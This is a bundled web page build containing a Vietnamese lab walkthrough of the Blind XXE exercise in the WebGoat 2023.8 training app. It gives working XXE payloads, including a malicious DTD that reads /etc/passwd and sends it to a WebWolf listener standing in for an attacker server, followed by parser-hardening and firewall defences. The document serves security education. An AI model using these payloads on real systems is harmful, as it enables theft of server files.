"use strict";(self.webpackChunktiennhm_github_io=self.webpackChunktiennhm_github_io||[]).push([[8235],{28453:(n,e,t)=>{t.d(e,{R:()=>l,x:()=>c});var i=t(96540);const r={},s=i.createContext(r);function l(n){const e=i.useContext(s);return i.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function c(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(r):n.components||r:l(n.components),i.createElement(s.Provider,{value:e},n.children)}},77268:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>o,contentTitle:()=>c,default:()=>g,frontMatter:()=>l,metadata:()=>i,toc:()=>h});const i=JSON.parse('{"id":"web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-10","title":"1.10 | XXE","description":"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8","source":"@site/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-10.md","sourceDirName":"02-web-security/webgoat-2023.8/A5-Security-Misconfiguration","slug":"/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-10","permalink":"/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-10","draft":false,"unlisted":false,"editUrl":"https://github.com/TienNHM/tiennhm.github.io/tree/master/docs/02-web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-10.md","tags":[{"inline":true,"label":"web-security","permalink":"/en/docs/tags/web-security"},{"inline":true,"label":"webgoat","permalink":"/en/docs/tags/webgoat"},{"inline":true,"label":"security-misconfiguration","permalink":"/en/docs/tags/security-misconfiguration"},{"inline":true,"label":"xxe","permalink":"/en/docs/tags/xxe"},{"inline":true,"label":"webgoat-2023.8","permalink":"/en/docs/tags/webgoat-2023-8"}],"version":"current","lastUpdatedAt":1755945789000,"sidebarPosition":1,"frontMatter":{"title":"1.10 | XXE","slug":"XXE-10","description":"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8","image":"https://tiennhm.github.io/img/docs/database.jpg","sidebar_position":1,"tags":["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],"keywords":["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],"enableComments":true,"draft":false},"sidebar":"tutorialSidebar","previous":{"title":"1.09 | XXE","permalink":"/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-09"},"next":{"title":"1.11 | XXE","permalink":"/en/docs/web-security/webgoat-2023.8/A5-Security-Misconfiguration/XXE-11"}}');var r=t(74848),s=t(28453);const l={title:"1.10 | XXE",slug:"XXE-10",description:"B\xe0i vi\u1ebft n\xe0y s\u1ebd h\u01b0\u1edbng d\u1eabn c\xe1ch t\u1ea5n c\xf4ng XXE tr\xean WebGoat 2023.8",image:"https://tiennhm.github.io/img/docs/database.jpg",sidebar_position:1,tags:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],keywords:["web-security","webgoat","security-misconfiguration","xxe","webgoat-2023.8"],enableComments:!0,draft:!1},c=void 0,o={},h=[{value:"<strong>1. Gi\u1edbi thi\u1ec7u v\u1ec1 Blind XXE</strong>",id:"1-gi\u1edbi-thi\u1ec7u-v\u1ec1-blind-xxe",level:2},{value:"<strong>2. C\xe1ch th\u1ef1c hi\u1ec7n Blind XXE</strong>",id:"2-c\xe1ch-th\u1ef1c-hi\u1ec7n-blind-xxe",level:2},{value:"<strong>1\ufe0f\u20e3 Chu\u1ea9n b\u1ecb m\xe1y ch\u1ee7 nh\u1eadn d\u1eef li\u1ec7u</strong>",id:"1\ufe0f\u20e3-chu\u1ea9n-b\u1ecb-m\xe1y-ch\u1ee7-nh\u1eadn-d\u1eef-li\u1ec7u",level:3},{value:"<strong>2\ufe0f\u20e3 T\u1ea1o file DTD \u0111\u1ed9c h\u1ea1i tr\xean WebWolf</strong>",id:"2\ufe0f\u20e3-t\u1ea1o-file-dtd-\u0111\u1ed9c-h\u1ea1i-tr\xean-webwolf",level:3},{value:"<strong>3\ufe0f\u20e3 G\u1eedi Payload Blind XXE</strong>",id:"3\ufe0f\u20e3-g\u1eedi-payload-blind-xxe",level:3},{value:"<strong>3. Ki\u1ec3m tra tr\xean WebWolf</strong>",id:"3-ki\u1ec3m-tra-tr\xean-webwolf",level:2},{value:"<strong>4. \u1ee8ng d\u1ee5ng Blind XXE \u0111\u1ec3 \u0111\xe1nh c\u1eafp d\u1eef li\u1ec7u</strong>",id:"4-\u1ee9ng-d\u1ee5ng-blind-xxe-\u0111\u1ec3-\u0111\xe1nh-c\u1eafp-d\u1eef-li\u1ec7u",level:2},{value:"<strong>5. C\xe1ch ph\xf2ng ch\u1ed1ng Blind XXE</strong>",id:"5-c\xe1ch-ph\xf2ng-ch\u1ed1ng-blind-xxe",level:2},{value:"<strong>1\ufe0f\u20e3 T\u1eaft x\u1eed l\xfd DOCTYPE v\xe0 ENTITY trong XML Parser</strong>",id:"1\ufe0f\u20e3-t\u1eaft-x\u1eed-l\xfd-doctype-v\xe0-entity-trong-xml-parser",level:3},{value:"<strong>2\ufe0f\u20e3 Gi\u1edbi h\u1ea1n quy\u1ec1n truy c\u1eadp m\u1ea1ng t\u1eeb XML Parser</strong>",id:"2\ufe0f\u20e3-gi\u1edbi-h\u1ea1n-quy\u1ec1n-truy-c\u1eadp-m\u1ea1ng-t\u1eeb-xml-parser",level:3},{value:"<strong>3\ufe0f\u20e3 S\u1eed d\u1ee5ng JSON thay v\xec XML</strong>",id:"3\ufe0f\u20e3-s\u1eed-d\u1ee5ng-json-thay-v\xec-xml",level:3},{value:"<strong>4\ufe0f\u20e3 Ki\u1ec3m tra log HTTP \u0111\u1ec3 ph\xe1t hi\u1ec7n XXE b\u1ea5t th\u01b0\u1eddng</strong>",id:"4\ufe0f\u20e3-ki\u1ec3m-tra-log-http-\u0111\u1ec3-ph\xe1t-hi\u1ec7n-xxe-b\u1ea5t-th\u01b0\u1eddng",level:3},{value:"<strong>6. K\u1ebft lu\u1eadn</strong>",id:"6-k\u1ebft-lu\u1eadn",level:2}];function d(n){const e={blockquote:"blockquote",br:"br",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.R)(),...n.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)(e.blockquote,{children:["\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.strong,{children:"Blind XXE Attack"})}),"\n"]}),"\n",(0,r.jsx)(e.h2,{id:"1-gi\u1edbi-thi\u1ec7u-v\u1ec1-blind-xxe",children:(0,r.jsx)(e.strong,{children:"1. Gi\u1edbi thi\u1ec7u v\u1ec1 Blind XXE"})}),"\n",(0,r.jsxs)(e.p,{children:[(0,r.jsx)(e.strong,{children:"Blind XXE (Blind XML External Entity Injection)"})," l\xe0 m\u1ed9t bi\u1ebfn th\u1ec3 c\u1ee7a ",(0,r.jsx)(e.strong,{children:"XXE"})," nh\u01b0ng kh\xf4ng tr\u1ea3 k\u1ebft qu\u1ea3 tr\u1ef1c ti\u1ebfp ra response c\u1ee7a server. \u0110i\u1ec1u n\xe0y x\u1ea3y ra khi:"]}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.strong,{children:"K\u1ebft qu\u1ea3 kh\xf4ng \u0111\u01b0\u1ee3c hi\u1ec3n th\u1ecb tr\xean trang web"})," (do output b\u1ecb \u1ea9n)."]}),"\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.strong,{children:"N\u1ed9i dung \u0111\u1ecdc \u0111\u01b0\u1ee3c ch\u1ee9a k\xfd t\u1ef1 XML kh\xf4ng h\u1ee3p l\u1ec7"}),", khi\u1ebfn parser g\u1eb7p l\u1ed7i."]}),"\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.strong,{children:"Firewall ho\u1eb7c c\u01a1 ch\u1ebf b\u1ea3o v\u1ec7 ng\u0103n ch\u1eb7n ph\u1ea3n h\u1ed3i tr\u1ef1c ti\u1ebfp"}),"."]}),"\n"]}),"\n",(0,r.jsxs)(e.p,{children:["\ud83d\udca1 ",(0,r.jsx)(e.strong,{children:"L\xe0m th\u1ebf n\xe0o \u0111\u1ec3 ki\u1ec3m tra xem XXE c\xf3 th\xe0nh c\xf4ng hay kh\xf4ng?"}),(0,r.jsx)(e.br,{}),"\n","\ud83d\udc49 ",(0,r.jsx)(e.strong,{children:"G\u1eedi d\u1eef li\u1ec7u \u0111\u1ebfn m\u1ed9t server do k\u1ebb t\u1ea5n c\xf4ng ki\u1ec3m so\xe1t"}),"."]}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.strong,{children:"V\xed d\u1ee5:"})}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:["G\u1eedi m\u1ed9t request ",(0,r.jsx)(e.strong,{children:"ping \u0111\u1ebfn WebWolf"}),"."]}),"\n",(0,r.jsxs)(e.li,{children:["G\u1eedi n\u1ed9i dung file ",(0,r.jsx)(e.strong,{children:"ra ngo\xe0i"})," qua HTTP/DNS request."]}),"\n"]}),"\n",(0,r.jsx)(e.h2,{id:"2-c\xe1ch-th\u1ef1c-hi\u1ec7n-blind-xxe",children:(0,r.jsx)(e.strong,{children:"2. C\xe1ch th\u1ef1c hi\u1ec7n Blind XXE"})}),"\n",(0,r.jsx)(e.h3,{id:"1\ufe0f\u20e3-chu\u1ea9n-b\u1ecb-m\xe1y-ch\u1ee7-nh\u1eadn-d\u1eef-li\u1ec7u",children:(0,r.jsx)(e.strong,{children:"1\ufe0f\u20e3 Chu\u1ea9n b\u1ecb m\xe1y ch\u1ee7 nh\u1eadn d\u1eef li\u1ec7u"})}),"\n",(0,r.jsxs)(e.p,{children:["K\u1ebb t\u1ea5n c\xf4ng c\u1ea7n c\xf3 m\u1ed9t server \u0111\u1ec3 nh\u1eadn d\u1eef li\u1ec7u, v\xed d\u1ee5: ",(0,r.jsx)(e.strong,{children:"WebWolf"}),".",(0,r.jsx)(e.br,{}),"\n","WebWolf l\xe0 c\xf4ng c\u1ee5 \u0111\u01b0\u1ee3c t\xedch h\u1ee3p v\u1edbi WebGoat \u0111\u1ec3 th\u1ef1c hi\u1ec7n c\xe1c b\xe0i t\u1eadp t\u1ea5n c\xf4ng."]}),"\n",(0,r.jsx)(e.p,{children:"\ud83d\udc49 Truy c\u1eadp WebWolf t\u1ea1i:"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{children:"http://127.0.0.1:9090/WebWolf/home\n"})}),"\n",(0,r.jsxs)(e.p,{children:["\ud83d\udd25 ",(0,r.jsx)(e.strong,{children:"L\u01b0u \xfd:"})," N\u1ebfu kh\xf4ng d\xf9ng WebWolf, c\xf3 th\u1ec3 thay th\u1ebf b\u1eb1ng m\u1ed9t server b\u1ea5t k\u1ef3 m\xe0 k\u1ebb t\u1ea5n c\xf4ng ki\u1ec3m so\xe1t."]}),"\n",(0,r.jsx)(e.h3,{id:"2\ufe0f\u20e3-t\u1ea1o-file-dtd-\u0111\u1ed9c-h\u1ea1i-tr\xean-webwolf",children:(0,r.jsx)(e.strong,{children:"2\ufe0f\u20e3 T\u1ea1o file DTD \u0111\u1ed9c h\u1ea1i tr\xean WebWolf"})}),"\n",(0,r.jsxs)(e.p,{children:["K\u1ebb t\u1ea5n c\xf4ng t\u1ea1o file ",(0,r.jsx)(e.code,{children:"attack.dtd"})," tr\xean WebWolf v\u1edbi n\u1ed9i dung:"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!ENTITY ping SYSTEM "http://127.0.0.1:9090/WebWolf/landing">\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\ud83d\udee0 ",(0,r.jsx)(e.strong,{children:"Gi\u1ea3i th\xedch"}),":"]}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.strong,{children:(0,r.jsx)(e.code,{children:"ping"})})," l\xe0 m\u1ed9t entity tham chi\u1ebfu \u0111\u1ebfn URL c\u1ee7a WebWolf."]}),"\n",(0,r.jsxs)(e.li,{children:["N\u1ebfu server m\u1ee5c ti\xeau x\u1eed l\xfd ",(0,r.jsx)(e.strong,{children:"DTD t\u1eeb xa"}),", n\xf3 s\u1ebd g\u1eedi request \u0111\u1ebfn WebWolf, x\xe1c nh\u1eadn r\u1eb1ng ",(0,r.jsx)(e.strong,{children:"XXE Injection ho\u1ea1t \u0111\u1ed9ng"}),"."]}),"\n"]}),"\n",(0,r.jsx)(e.h3,{id:"3\ufe0f\u20e3-g\u1eedi-payload-blind-xxe",children:(0,r.jsx)(e.strong,{children:"3\ufe0f\u20e3 G\u1eedi Payload Blind XXE"})}),"\n",(0,r.jsxs)(e.p,{children:["Sau khi chu\u1ea9n b\u1ecb xong ",(0,r.jsx)(e.code,{children:"attack.dtd"}),", ta g\u1eedi XML sau \u0111\u1ebfn server m\u1ee5c ti\xeau:"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE root [\n    <!ENTITY % remote SYSTEM "http://127.0.0.1:9090/WebWolf/attack.dtd">\n    %remote;\n]>\n<comment>\n  <text>test&ping;</text>\n</comment>\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\ud83d\udee0 ",(0,r.jsx)(e.strong,{children:"Gi\u1ea3i th\xedch"}),":"]}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:["DTD t\u1eeb xa (",(0,r.jsx)(e.code,{children:"attack.dtd"}),") \u0111\u01b0\u1ee3c n\u1ea1p v\xe0o server m\u1ee5c ti\xeau."]}),"\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.code,{children:"&ping;"})," s\u1ebd l\xe0m server g\u1eedi request \u0111\u1ebfn ",(0,r.jsx)(e.strong,{children:"WebWolf"}),"."]}),"\n"]}),"\n",(0,r.jsxs)(e.p,{children:["\ud83d\udd25 ",(0,r.jsx)(e.strong,{children:"K\u1ebft qu\u1ea3 mong \u0111\u1ee3i"}),":"]}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:["N\u1ebfu server d\u1ec5 b\u1ecb t\u1ea5n c\xf4ng, n\xf3 s\u1ebd g\u1eedi m\u1ed9t request HTTP \u0111\u1ebfn ",(0,r.jsx)(e.strong,{children:"WebWolf"}),"."]}),"\n",(0,r.jsxs)(e.li,{children:["WebWolf s\u1ebd ghi l\u1ea1i request n\xe0y trong ",(0,r.jsx)(e.strong,{children:"Incoming Requests"}),"."]}),"\n"]}),"\n",(0,r.jsx)(e.h2,{id:"3-ki\u1ec3m-tra-tr\xean-webwolf",children:(0,r.jsx)(e.strong,{children:"3. Ki\u1ec3m tra tr\xean WebWolf"})}),"\n",(0,r.jsxs)(e.p,{children:["M\u1edf WebWolf v\xe0 truy c\u1eadp ",(0,r.jsx)(e.strong,{children:"Incoming Requests"}),". N\u1ebfu XXE Injection th\xe0nh c\xf4ng, ta s\u1ebd th\u1ea5y log:"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n  "method" : "GET",\n  "path" : "/landing",\n  "headers" : {\n    "request" : {\n      "user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"\n    }\n  },\n  "parameters" : {\n    "test" : [ "HelloWorld" ]\n  },\n  "timeTaken" : "1"\n}\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\ud83d\udccc ",(0,r.jsx)(e.strong,{children:"K\u1ebft qu\u1ea3 n\xe0y cho th\u1ea5y server \u0111\xe3 g\u1eedi request \u0111\u1ebfn WebWolf, x\xe1c nh\u1eadn r\u1eb1ng XXE Injection c\xf3 th\u1ec3 th\u1ef1c hi\u1ec7n \u0111\u01b0\u1ee3c."})]}),"\n",(0,r.jsx)(e.h2,{id:"4-\u1ee9ng-d\u1ee5ng-blind-xxe-\u0111\u1ec3-\u0111\xe1nh-c\u1eafp-d\u1eef-li\u1ec7u",children:(0,r.jsx)(e.strong,{children:"4. \u1ee8ng d\u1ee5ng Blind XXE \u0111\u1ec3 \u0111\xe1nh c\u1eafp d\u1eef li\u1ec7u"})}),"\n",(0,r.jsxs)(e.p,{children:["Sau khi x\xe1c nh\u1eadn ",(0,r.jsx)(e.strong,{children:"Blind XXE ho\u1ea1t \u0111\u1ed9ng"}),", k\u1ebb t\u1ea5n c\xf4ng c\xf3 th\u1ec3:"]}),"\n",(0,r.jsxs)(e.ol,{children:["\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.strong,{children:"\u0110\u1ecdc file quan tr\u1ecdng tr\xean server"})," (VD: ",(0,r.jsx)(e.code,{children:"/etc/passwd"}),")."]}),"\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.strong,{children:"G\u1eedi n\u1ed9i dung file ra ngo\xe0i"})," qua HTTP/DNS request."]}),"\n"]}),"\n",(0,r.jsxs)(e.p,{children:["\ud83d\udd25 ",(0,r.jsxs)(e.strong,{children:["V\xed d\u1ee5: \u0110\u1ecdc file ",(0,r.jsx)(e.code,{children:"/etc/passwd"})," v\xe0 g\u1eedi n\u1ed9i dung \u0111\u1ebfn WebWolf"]})]}),"\n",(0,r.jsxs)(e.p,{children:["1\ufe0f\u20e3 ",(0,r.jsxs)(e.strong,{children:["C\u1eadp nh\u1eadt file ",(0,r.jsx)(e.code,{children:"attack.dtd"})," tr\xean WebWolf:"]})]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0" encoding="UTF-8"?>\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY exfiltrate SYSTEM \'http://127.0.0.1:9090/WebWolf/log?data=%file;\'>">\n%eval;\n'})}),"\n",(0,r.jsxs)(e.p,{children:["2\ufe0f\u20e3 ",(0,r.jsx)(e.strong,{children:"G\u1eedi XML payload \u0111\u1ebfn server m\u1ee5c ti\xeau:"})]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-xml",children:'<?xml version="1.0"?>\n<!DOCTYPE root [\n    <!ENTITY % remote SYSTEM "http://127.0.0.1:9090/WebWolf/attack.dtd">\n    %remote;\n]>\n<comment>\n  <text>&exfiltrate;</text>\n</comment>\n'})}),"\n",(0,r.jsxs)(e.p,{children:["\ud83d\udccc ",(0,r.jsx)(e.strong,{children:"K\u1ebft qu\u1ea3 mong \u0111\u1ee3i:"})]}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:["Server \u0111\u1ecdc n\u1ed9i dung ",(0,r.jsx)(e.code,{children:"/etc/passwd"}),"."]}),"\n",(0,r.jsx)(e.li,{children:"G\u1eedi d\u1eef li\u1ec7u n\xe0y \u0111\u1ebfn WebWolf th\xf4ng qua request HTTP."}),"\n",(0,r.jsx)(e.li,{children:"K\u1ebb t\u1ea5n c\xf4ng c\xf3 th\u1ec3 xem d\u1eef li\u1ec7u trong WebWolf logs."}),"\n"]}),"\n",(0,r.jsx)(e.h2,{id:"5-c\xe1ch-ph\xf2ng-ch\u1ed1ng-blind-xxe",children:(0,r.jsx)(e.strong,{children:"5. C\xe1ch ph\xf2ng ch\u1ed1ng Blind XXE"})}),"\n",(0,r.jsx)(e.h3,{id:"1\ufe0f\u20e3-t\u1eaft-x\u1eed-l\xfd-doctype-v\xe0-entity-trong-xml-parser",children:(0,r.jsx)(e.strong,{children:"1\ufe0f\u20e3 T\u1eaft x\u1eed l\xfd DOCTYPE v\xe0 ENTITY trong XML Parser"})}),"\n",(0,r.jsx)(e.p,{children:"Trong Java:"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-java",children:'DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nfactory.setFeature("http://xml.org/sax/features/external-general-entities", false);\nfactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);\nfactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);\nDocumentBuilder builder = factory.newDocumentBuilder();\n'})}),"\n",(0,r.jsx)(e.h3,{id:"2\ufe0f\u20e3-gi\u1edbi-h\u1ea1n-quy\u1ec1n-truy-c\u1eadp-m\u1ea1ng-t\u1eeb-xml-parser",children:(0,r.jsx)(e.strong,{children:"2\ufe0f\u20e3 Gi\u1edbi h\u1ea1n quy\u1ec1n truy c\u1eadp m\u1ea1ng t\u1eeb XML Parser"})}),"\n",(0,r.jsxs)(e.p,{children:["N\u1ebfu \u1ee9ng d\u1ee5ng c\xf3 quy\u1ec1n h\u1ea1n ch\u1ebf, c\xf3 th\u1ec3 ch\u1eb7n ",(0,r.jsx)(e.strong,{children:"outbound HTTP requests"})," \u0111\u1ec3 ng\u0103n d\u1eef li\u1ec7u b\u1ecb g\u1eedi ra ngo\xe0i."]}),"\n",(0,r.jsxs)(e.p,{children:["V\xed d\u1ee5 trong ",(0,r.jsx)(e.strong,{children:"Docker"})," ho\u1eb7c ",(0,r.jsx)(e.strong,{children:"Kubernetes"}),", c\xf3 th\u1ec3 c\u1ea5u h\xecnh firewall:"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"iptables -A OUTPUT -p tcp --dport 9090 -j DROP\n"})}),"\n",(0,r.jsx)(e.h3,{id:"3\ufe0f\u20e3-s\u1eed-d\u1ee5ng-json-thay-v\xec-xml",children:(0,r.jsx)(e.strong,{children:"3\ufe0f\u20e3 S\u1eed d\u1ee5ng JSON thay v\xec XML"})}),"\n",(0,r.jsx)(e.p,{children:"N\u1ebfu \u1ee9ng d\u1ee5ng kh\xf4ng c\u1ea7n XML, h\xe3y d\xf9ng JSON \u0111\u1ec3 tr\xe1nh l\u1ed7 h\u1ed5ng XXE:"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-json",children:'{\n  "message": "Hello, world!"\n}\n'})}),"\n",(0,r.jsx)(e.h3,{id:"4\ufe0f\u20e3-ki\u1ec3m-tra-log-http-\u0111\u1ec3-ph\xe1t-hi\u1ec7n-xxe-b\u1ea5t-th\u01b0\u1eddng",children:(0,r.jsx)(e.strong,{children:"4\ufe0f\u20e3 Ki\u1ec3m tra log HTTP \u0111\u1ec3 ph\xe1t hi\u1ec7n XXE b\u1ea5t th\u01b0\u1eddng"})}),"\n",(0,r.jsxs)(e.p,{children:["N\u1ebfu c\xf3 request \u0111\xe1ng ng\u1edd t\u1eeb h\u1ec7 th\u1ed1ng g\u1eedi \u0111\u1ebfn server kh\xf4ng x\xe1c \u0111\u1ecbnh, c\xf3 th\u1ec3 ki\u1ec3m tra ",(0,r.jsx)(e.strong,{children:"log HTTP request"})," \u0111\u1ec3 ph\xe1t hi\u1ec7n d\u1ea5u hi\u1ec7u c\u1ee7a XXE."]}),"\n",(0,r.jsx)(e.h2,{id:"6-k\u1ebft-lu\u1eadn",children:(0,r.jsx)(e.strong,{children:"6. K\u1ebft lu\u1eadn"})}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.strong,{children:"Blind XXE kh\xf4ng hi\u1ec3n th\u1ecb k\u1ebft qu\u1ea3 tr\u1ef1c ti\u1ebfp"})," nh\u01b0ng v\u1eabn c\xf3 th\u1ec3 ",(0,r.jsx)(e.strong,{children:"g\u1eedi d\u1eef li\u1ec7u ra ngo\xe0i"}),"."]}),"\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.strong,{children:"C\xe1ch ki\u1ec3m tra Blind XXE"}),":","\n",(0,r.jsxs)(e.ol,{children:["\n",(0,r.jsx)(e.li,{children:"S\u1eed d\u1ee5ng WebWolf \u0111\u1ec3 nh\u1eadn request."}),"\n",(0,r.jsx)(e.li,{children:"G\u1eedi d\u1eef li\u1ec7u ra ngo\xe0i qua HTTP/DNS request."}),"\n"]}),"\n"]}),"\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.strong,{children:"K\u1ebb t\u1ea5n c\xf4ng c\xf3 th\u1ec3 \u0111\xe1nh c\u1eafp d\u1eef li\u1ec7u b\xed m\u1eadt"})," nh\u01b0 ",(0,r.jsx)(e.code,{children:"/etc/passwd"}),"."]}),"\n",(0,r.jsxs)(e.li,{children:[(0,r.jsx)(e.strong,{children:"C\xe1ch ph\xf2ng ch\u1ed1ng"}),":","\n",(0,r.jsxs)(e.ol,{children:["\n",(0,r.jsx)(e.li,{children:"V\xf4 hi\u1ec7u h\xf3a ENTITY trong XML Parser."}),"\n",(0,r.jsx)(e.li,{children:"Ch\u1eb7n HTTP request kh\xf4ng mong mu\u1ed1n."}),"\n",(0,r.jsx)(e.li,{children:"S\u1eed d\u1ee5ng JSON thay cho XML."}),"\n"]}),"\n"]}),"\n"]})]})}function g(n={}){const{wrapper:e}={...(0,s.R)(),...n.components};return e?(0,r.jsx)(e,{...n,children:(0,r.jsx)(d,{...n})}):d(n)}}}]);